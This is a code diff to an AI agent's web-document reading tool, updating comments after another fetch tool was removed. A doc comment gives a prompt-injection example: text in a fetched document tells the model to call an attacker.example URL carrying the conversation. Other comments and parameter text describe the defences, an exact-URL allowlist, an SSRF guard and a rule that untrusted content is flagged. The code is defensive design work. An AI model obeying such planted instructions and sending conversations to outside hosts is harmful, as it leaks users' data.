@@ -9,9 +9,8 @@ namespace Agent42.Agents;
 /// from our own container, ingests it into this conversation's retrieval index, and answers the current
 /// turn from excerpts ranked <b>in process</b>.
 ///
-/// <para>This is the second, document-only web path. <c>fetch_web_page</c> (ADR 0027) is unchanged and
-/// still runs on the hosted context.dev scrape API, which cannot deliver document bytes at all — which
-/// is why the SSRF guard came back for this path only.</para>
+/// <para>This is the only model-invoked web fetch path (ADR 0125 removed <c>fetch_web_page</c>), and it
+/// dials the model-chosen URL from our own container, which is why it carries the SSRF guard.</para>
 /// </summary>
 public sealed partial class AgentGrain
 {
@@ -19,12 +18,12 @@ public sealed partial class AgentGrain
     /// Agent tool: reads a web-hosted DOCUMENT into this conversation's searchable context. Exposed to
     /// the model as <c>read_web_document</c>; see <c>Skills/websearch/SKILL.md</c> for guidance.
     ///
-    /// <para><b>The allowlist check is the same security boundary <c>fetch_web_page</c> enforces</b>, for
-    /// the same reason and with the same whole-URL rule: a document's text enters the model's context,
+    /// <para><b>The allowlist check is a security boundary</b> (see <c>IsFetchableUrl</c>), with the
+    /// whole-URL rule: a document's text enters the model's context,
     /// and an instruction written inside it can tell the model to fetch
     /// <c>https://attacker.example/?q=&lt;conversation&gt;</c>. Pinning the exact URL means the model may
     /// only read a string a search engine or the user produced verbatim. There is <b>no</b> link
-    /// following here, so — unlike ADR 0027 — nothing on this path is allowlist-exempt.</para>
+    /// following here, so nothing on this path is allowlist-exempt.</para>
     ///
     /// <para><b>The "verbatim" half is conditional since ADR 0067.</b> A URL a <i>URL-seeding</i> MCP
     /// server returned in a tool result is allowlisted too (<c>AgentGrainState.SeededFetchableUrls</c>),
@@ -45,7 +44,7 @@ public sealed partial class AgentGrain
     /// deferred rebuild is for.</para>
     /// </summary>
     private async Task<string> ReadWebDocumentAsync(
-        [Description("The absolute http(s) URL of the document to read (PDF, Word, PowerPoint, Excel or text). It must be a URL exactly as it came back from web_search in this conversation, exactly as the user sent it, or exactly as another tool returned it to you — you may not add or change a path or query string, and you may not take a URL out of the text of a page. For an ordinary web page use fetch_web_page instead.")] string url,
+        [Description("The absolute http(s) URL of the document to read (PDF, Word, PowerPoint, Excel or text). It must be a URL exactly as it came back from web_search in this conversation, exactly as the user sent it, or exactly as another tool returned it to you — you may not add or change a path or query string, and you may not take a URL out of the text of a page. Ordinary web pages can't be read here.")] string url,
         [Description("What you want to know from this document, phrased as a question or topic. The most relevant passages are returned for it.")] string question)
     {
         if (!Uri.TryCreate(url, UriKind.Absolute, out var uri) ||
@@ -76,7 +75,7 @@ public sealed partial class AgentGrain
         {
             return "I cannot read a document into an incognito chat. Ingesting a document stores its text " +
                 "for retrieval, which an incognito chat deliberately never does. Start a normal chat to " +
-                "read this document, or ask me to summarise the page with fetch_web_page instead.";
+                "read this document.";
         }
 
         // Already read in this conversation: do NOT fetch or ingest again. Re-ingest replaces a name's chunks
@@ -239,9 +238,8 @@ public sealed partial class AgentGrain
         return [.. scored.OrderByDescending(x => x.Score).Select(x => x.Chunk)];
     }
 
-    // Shapes the tool result handed to the model. The UNTRUSTED note is the same defence
-    // BuildFetchPayload applies to followed pages (ADR 0027) and is why this content must never be
-    // described as user-uploaded — the instructions half of the same rule lives in WithDocumentAwareness.
+    // Shapes the tool result handed to the model. The UNTRUSTED note is why this content
+    // must never be described as user-uploaded — the instructions half of the same rule lives in WithDocumentAwareness.
     private static object BuildWebDocumentPayload(
         WebDocument document, IngestedDocument ingested, IReadOnlyList<WebDocumentExcerpt> excerpts) => new
         {
